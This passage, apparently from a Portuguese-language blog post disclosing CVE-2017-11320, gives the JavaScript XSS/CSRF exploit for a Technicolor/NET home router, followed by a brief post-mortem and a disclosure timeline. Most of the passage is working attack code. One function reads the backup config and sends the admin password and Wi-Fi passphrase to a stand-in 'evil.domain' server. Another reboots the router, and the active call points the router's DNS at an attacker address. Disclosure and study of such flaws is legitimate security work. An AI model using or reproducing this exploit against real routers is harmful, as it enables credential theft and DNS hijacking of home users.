<span class="w">    </span>//<span class="w"> </span>attackers_server<span class="w"> </span>=<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>send<span class="w"> </span>the<span class="w"> </span>credentials
<span class="w">    </span>//<span class="w"> </span>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<span class="w">    </span>//<span class="w"> </span>XSS<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>Admin&#39;s<span class="w"> </span>login/passwd<span class="w"> </span>+<span class="w"> </span>Wifi<span class="w"> </span>passphrase
<span class="w">    </span>//<span class="w"> </span>from<span class="w"> </span>backup<span class="w"> </span>settings<span class="w"> </span>

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/backupsettings.cmd&quot;,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>GET<span class="w"> </span>the<span class="w"> </span>Backup<span class="w"> </span>XML
<span class="w">    </span>xmlhttp.send();
<span class="w">    </span>var<span class="w"> </span>k<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;Admin&quot;)<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Search<span class="w"> </span>for<span class="w"> </span>Admin&#39;s<span class="w"> </span>Login<span class="w"> </span>and<span class="w"> </span>Password
<span class="w">    </span>var<span class="w"> </span>y<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;KeyPassphrase&quot;)<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Search<span class="w"> </span>for<span class="w"> </span>Wifi<span class="w"> </span>PassPhrase
<span class="w">    </span>//<span class="w"> </span>Add<span class="w"> </span>a<span class="w"> </span>img<span class="w"> </span>requesting<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>website<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>leaked<span class="w"> </span>passwords<span class="w"> </span>in<span class="w"> </span>the<span class="w"> </span>GET<span class="w"> </span>parameters
<span class="w">    </span>document.write(&#39;<span class="nt">&lt;img</span><span class="w"> </span><span class="na">src=</span><span class="s">&quot;&#39;+attackers_server+&#39;?net=&#39;+ encodeURIComponent(xmlhttp.responseText.slice(k,k+100)+xmlhttp.responseText.slice(y,y+80))+&#39;&quot;</span><span class="nt">&gt;</span>&#39;);<span class="w"> </span>
}

function<span class="w"> </span>reboot_router()<span class="w"> </span>{
<span class="w">    </span>//<span class="w"> </span>XSS<span class="w"> </span>+<span class="w"> </span>CSRF<span class="w"> </span>reboot<span class="w"> </span>router
<span class="w">    </span>//<span class="w"> </span>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<span class="w">    </span>//<span class="w"> </span>Why?<span class="w"> </span>Because<span class="w"> </span>It&#39;s<span class="w"> </span>fun<span class="w"> </span>to<span class="w"> </span>watch<span class="w"> </span>a<span class="w"> </span>XSS<span class="w"> </span>doing<span class="w"> </span>&#39;physical&#39;<span class="w"> </span>stuff

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/resetrouter.html&quot;,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>GET<span class="w"> </span>the<span class="w"> </span>page<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>reset<span class="w"> </span>interface
<span class="w">    </span>xmlhttp.send();
<span class="w">    </span>var<span class="w"> </span>w<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;Key&quot;)<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Search<span class="w"> </span>for<span class="w"> </span>the<span class="w"> </span>SessionKey,<span class="w"> </span>some<span class="w"> </span>sort<span class="w"> </span>of<span class="w"> </span>CSRF<span class="w"> </span>Token
<span class="w">    </span>var<span class="w"> </span>sessionKey<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Regex<span class="w"> </span>because<span class="w"> </span>the<span class="w"> </span>key<span class="w"> </span>is<span class="w"> </span>inside<span class="w"> </span>quotes

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/rebootinfo.cgi?sessionKey=&quot;+sessionKey,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>Request<span class="w"> </span>the<span class="w"> </span>reboot<span class="w"> </span>page<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>CSRF<span class="w"> </span>token
<span class="w">    </span>xmlhttp.send();
}

function<span class="w"> </span>dns_poisoning(attackers_dns)<span class="w"> </span>{
<span class="w">    </span>//<span class="w"> </span>attackers_dns<span class="w"> </span>=<span class="w"> </span>malicious<span class="w"> </span>DNS<span class="w"> </span>Server
<span class="w">    </span>//<span class="w"> </span>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<span class="w"> </span>holy<span class="w"> </span>shit<span class="w"> </span>my<span class="w"> </span>code<span class="w"> </span>is<span class="w"> </span>ugly<span class="w"> </span>as<span class="w"> </span>fuck<span class="w"> </span>,<span class="w"> </span>sorry<span class="w"> </span>world
<span class="w">    </span>//<span class="w"> </span>Alter<span class="w"> </span>the<span class="w"> </span>DNS<span class="w"> </span>Config<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>Router
<span class="w">    </span>//<span class="w"> </span>changing<span class="w"> </span>the<span class="w"> </span>Primary<span class="w"> </span>and<span class="w"> </span>Secondary<span class="w"> </span>DNS<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>attacker&#39;s<span class="w"> </span>one

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();<span class="w">   </span>
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/rede-dnsv4.html&quot;,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>GET<span class="w"> </span>the<span class="w"> </span>DNS<span class="w"> </span>Config<span class="w"> </span>page
<span class="w">    </span>xmlhttp.send();
<span class="w">    </span>var<span class="w"> </span>w<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;Key&quot;)<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Search<span class="w"> </span>for<span class="w"> </span>the<span class="w"> </span>SessionKey,<span class="w"> </span>some<span class="w"> </span>sort<span class="w"> </span>of<span class="w"> </span>CSRF<span class="w"> </span>Token
<span class="w">    </span>var<span class="w"> </span>sessionKey<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Regex<span class="w"> </span>because<span class="w"> </span>the<span class="w"> </span>key<span class="w"> </span>is<span class="w"> </span>inside<span class="w"> </span>quotes
<span class="w">    </span>var<span class="w"> </span>i_wanip<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;wanip&quot;)<span class="w"> </span>;
<span class="w">    </span>var<span class="w"> </span>wanip<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;
<span class="w">    </span>var<span class="w"> </span>i_wansubnet<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;wansubnet&quot;)<span class="w"> </span>;<span class="w"> </span>
<span class="w">    </span>var<span class="w"> </span>wansubnet<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;
<span class="w">    </span>var<span class="w"> </span>i_wangatewayip<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;)<span class="w"> </span>;<span class="w"> </span>
<span class="w">    </span>var<span class="w"> </span>wangatewayip<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/rede-dnsv4.cgi?enblDhcpClnt=0<span class="err">&amp;</span>wanIpAddress=&quot;+wanip+&quot;<span class="err">&amp;</span>wanIfName=wanbridge<span class="err">&amp;</span>wanSubnetMask=&quot;+wansubnet+&quot;<span class="err">&amp;</span>wanIntfGateway=&quot;+wangatewayip+&quot;<span class="err">&amp;</span>dnsPrimary=&quot;+attackers_dns+&quot;<span class="err">&amp;</span>dnsSecondary=&quot;+attackers_dns+&quot;<span class="err">&amp;</span>sessionKey=&quot;+sessionKey,<span class="w"> </span>false);
<span class="w">    </span>xmlhttp.send();<span class="w"> </span>//<span class="w"> </span>Send<span class="w"> </span>the<span class="w"> </span>request<span class="w"> </span>to<span class="w"> </span>SAVE<span class="w"> </span>the<span class="w"> </span>Primary<span class="w"> </span>and<span class="w"> </span>Secondary<span class="w"> </span>DNS<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>CSRF<span class="w"> </span>Token

<span class="w">    </span>//After<span class="w"> </span>saving<span class="w"> </span>we<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>apply<span class="w"> </span>the<span class="w"> </span>settings.<span class="w"> </span>yeah,<span class="w"> </span>fuck<span class="w"> </span>logic<span class="w"> </span>--&#39;

<span class="w">    </span>//Getting<span class="w"> </span>a<span class="w"> </span>brand<span class="w"> </span>NEW<span class="w"> </span>SessionKey
<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();<span class="w">   </span>
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/rede-dnsv4.html&quot;,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>GET<span class="w"> </span>the<span class="w"> </span>DNS<span class="w"> </span>Config<span class="w"> </span>page
<span class="w">    </span>xmlhttp.send();
<span class="w">    </span>var<span class="w"> </span>w<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.indexOf(&quot;Key&quot;)<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Search<span class="w"> </span>for<span class="w"> </span>the<span class="w"> </span>SessionKey,<span class="w"> </span>some<span class="w"> </span>sort<span class="w"> </span>of<span class="w"> </span>CSRF<span class="w"> </span>Token
<span class="w">    </span>var<span class="w"> </span>sessionKey<span class="w"> </span>=<span class="w"> </span>xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1]<span class="w"> </span>;<span class="w"> </span>//<span class="w"> </span>Regex<span class="w"> </span>because<span class="w"> </span>the<span class="w"> </span>key<span class="w"> </span>is<span class="w"> </span>inside<span class="w"> </span>quotes

<span class="w">    </span>xmlhttp=new<span class="w"> </span>XMLHttpRequest();<span class="w">   </span>
<span class="w">    </span>xmlhttp.open(&quot;GET&quot;,<span class="w"> </span>&quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey,<span class="w"> </span>false);<span class="w"> </span>//<span class="w"> </span>GET<span class="w"> </span>the<span class="w"> </span>apply<span class="w"> </span>DNS<span class="w"> </span>page
<span class="w">    </span>xmlhttp.send();
}

//<span class="w"> </span>Choose<span class="w"> </span>your<span class="w"> </span>path<span class="w"> </span>!
//get_passwords(&quot;http://evil.domain/&quot;)<span class="w"> </span>;
//reboot_router();
dns_poisoning(&quot;1.3.3.7&quot;)
</code></pre></div>

<h4>PostMortem</h4>
<ul>
<li>Pretendo ler o UART essa semana ainda para ver se consigo desbloquear a porta</li>
<li>A página vulnerável está toda em inglês, talvez seja default do chip Broadcom, mas não tenho como testar. Teste o seu modem para ver se wlscanresults.html existe, se existir me avisa, e você provavelmente estará vulnerável (:</li>
</ul>
<h3>TimeLine</h3>
<ul>
<li>08/07/2017 — Primeiro Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>16/07/2017 — Segundo Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>18/07/2017 — Terceiro Email enviado à Technicolor/NET (Sem Resposta)</li>
<li>02/08/2017 — Full disclosure : CVE-2017–11320</li>
</ul>
<h3>Refs</h3>
<p>[1] <a href="https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf">https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf</a></p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>